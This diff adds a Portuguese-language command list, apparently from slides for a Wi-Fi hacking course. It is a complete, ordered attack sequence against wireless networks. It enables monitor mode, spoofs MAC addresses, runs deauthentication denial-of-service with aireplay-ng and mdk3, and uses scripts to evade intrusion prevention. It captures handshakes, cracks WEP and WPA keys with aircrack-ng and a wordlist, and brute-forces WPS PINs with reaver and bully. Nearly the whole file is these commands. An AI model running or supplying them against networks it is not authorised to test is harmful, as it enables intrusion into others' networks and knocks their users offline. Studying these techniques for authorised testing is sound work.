@@ -1,0 +1,140 @@
+==============================================================
+## COMANDOS NA ORDEM QUE APARECEM NOS SLIDES
+==============================================================
+==============================================================
+### QUEBRANDO WEP/WPA/WPA2/WPS
+==============================================================
+# Verificar e habilitar modo monitor
+iw dev
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+iw dev
+
+==============================================================
+# Verificar se a Interface está em modo monitor
+iw dev
+iwconfig
+
+==============================================================
+# Usando o Airodump-ng
+airodump-ng --help
+airodump-ng --wps wlan0mon
+airodump-ng --ivs wlan0mon -w capturaIVS
+airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 11 wlan0mon
+
+==============================================================
+# MAC Spoofing
+ip link set wlan0mon down
+macchanger --help
+macchanger --mac=AA:BB:CC:DD:EE:FF wlan0mon
+ip link set wlan0mon up
+
+ip link set wlan0mon down
+macchanger -r wlan0mon
+ip link set wlan0mon up
+
+==============================================================
+# DeAuth (DoS dos clientes conectados no roteador alvo)
+aireplay-ng --help
+aireplay-ng --deauth 0 -a 00:AB:6C:CD:40:70 -c C8:3A:35:14:51:40 wlan0mon
+aireplay-ng -0 1 -a 00:AB:6C:CD:40:70 wlan0mon
+aireplay-ng -0 1 -e "ALVOUG_ROTEADOR" wlan0mon
+
+==============================================================
+# DeAuth (DoS com MDK3)
+mdk3 --help
+mdk3 wlan0mon a
+mdk3 wlan0mon m -t AA:BB:CC:DD:EE:FF
+mdk3 wlan0mon d -b blacklist.txt -c 6
+mdk3 wlan0mon b -t AA:BB:CC:DD:EE:FF -c 6
+wash -i wlan0mon -s -F
+
+==============================================================
+# Monitorar tráfego com Airodump
+airodump-ng --help
+airodump-ng wlan0mon
+airodump-ng --write trafegoCAPTURADO wlan0mon 
+
+==============================================================
+## Bypass em WIPS com script criado ##
+# Permissão de execução do script
+chmod +x script-deauth-simples.sh
+chmod +x script-deauth-melhorado.sh
+
+# Execução do Script Simples
+./script-deauth-simples.sh AA:BB:CC:DD:EE:FF wlan0mon 9
+
+# Execução do Script Melhorado
+./script-deauth-melhorado.sh -d AA:BB:CC:DD:EE:FF wlan0mon 9
+./script-deauth-melhorado.sh -dm AA:BB:CC:DD:EE:FF wlan0mon 9
+
+==============================================================
+# Capturar tráfego de redes wep
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng --ivs -w chaveWEP wlan0mon
+airodump-ng -c 6 --bssid 18:17:25:0E:F5:A0 -w chaveWEP wlan0mon
+airodump-ng --encrypt wep --write chaveWEP wlan0mon
+airodump-ng --encrypt wep --write chaveWEP --bssid ALVOUG_WEP --channel 6 wlan0mon
+iwconfig wlan0mon channel 6
+airodump-ng --channel 6 --bssid EC:22:80:9B:A1:4A -w chaveWEP wlan0mon
+# CTRL + C quando IVS (coluna DATA) chegar acima de 20.000
+
+
+# Injetando Requisições ARP com Aireplay-ng
+aireplay-ng --arpreplay -e "ALVOUG_WEP" -b EC:22:80:9B:A1:4A -h BC:85:56:FE:4C:1D wlan0mon
+
+# Quebrar WEP de arquivo capturado
+ls -lh
+aircrack-ng chaveWEP-01.cap
+
+# Decriptar dados criptografados de tráfego capturado da rede exemplo
+airdecap-ng -w FA:3E:A4:6F:5D chaveCAPTURADA.cap
+
+==============================================================
+# Capturar tráfego de redes com wpa/wpa2
+airodump-ng --encrypt wpa wlan0mon
+airodump-ng --channel 3 --bssid 00:1B:11:D4:1D:F1 --write chaveWPA wlan0mon
+airodump-ng -c 3 --bssid 00:1B:11:D4:1D:F1 -w chaveWPA wlan0mon
+CTRL + C quando capturado o HANDSHAKE do ALVO
+
+# DeAuth de clientes conectados no roteador alvo
+aireplay-ng --deauth 30 -a 00:1B:11:D4:1D:F1 -c 04:1B:6D:E8:D2:21 wlan0mon
+
+
+# Limpar arquivo com dados capturados wpa/wpa2
+wpaclean chaveWPALimpa.cap chaveWPASuja.cap
+
+
+# Brute-force com wordlist em arquivo capturado contendo o handshake
+aircrack-ng -w wordlistcriada.txt chaveLimpaWPA.cap
+
+==============================================================
+# Verificar se o computador está associado ao AP atacado
+iw wlan0 link
+iwconfig
+
+# Verificar IP recebido
+ip -c addr show
+
+==============================================================
+# Monitorar e identificar tráfego com equipamentos que possuam o WPS ATIVO
+airodump-ng --wps -M wlan0mon
+wash -F -s -i wlan0mon
+
+# Ataque de força bruta com reaver no equipamento alvo com wps
+reaver --help
+reaver -i wlan0mon -b C8:3A:35:14:51:40 -f -c 9 -vv
+reaver -i wlan0mon -b C8:3A:35:14:51:40 -f -c 9 -d 300 -vv
+
+# Tentar quebrar com pixiewps
+reaver -i wlan0mon -b C8:3A:35:14:51:40 -f -c 9 -vv -K
+reaver -i wlan0mon -b C8:3A:35:14:51:40 -f -c 9 -vv -Z
+
+# Recuperar a chave (senha) após conseguir o PIN WPS
+reaver -i wlan0mon -b 18:17:25:0E:F5:A0 -f -c 11 -vv -p 65614969
+
+# Ataque de força bruta com bully no equipamento alvo com wps
+bully --help
+bully wlan0mon -b C8:3A:35:14:51:40 -e "ALVOUG_WPS" -c 9
